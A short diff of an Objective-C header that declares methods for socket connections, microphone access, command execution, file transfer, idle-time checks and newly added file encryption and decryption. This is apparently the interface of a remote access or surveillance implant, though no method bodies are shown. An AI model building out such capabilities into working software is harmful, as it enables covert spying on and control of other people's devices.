@@ -27,8 +27,7 @@ extern int sockfd;
 -(int)connect:(NSString*)host
              :(long)port;
 -(void)sendData:(NSData *)data;
--(void)sendString:(NSString *)string
-                 :(NSString *)key;
+-(void)sendString:(NSString *)string;
 
 //mic
 -(void)mic:(NSArray *)args;
@@ -50,6 +49,9 @@ extern int sockfd;
 -(void)changeWD:(NSArray *)args;
 -(void)receiveFile:(NSString *)saveToPath;
 -(void)sendFile:(NSData *)fileData;
+-(void)encryptFile:(NSArray *)args;
+-(void)decryptFile:(NSArray *)args;
+
 //misc
 -(void)executeCMD:(NSArray *)args;
 -(void)idleTime;
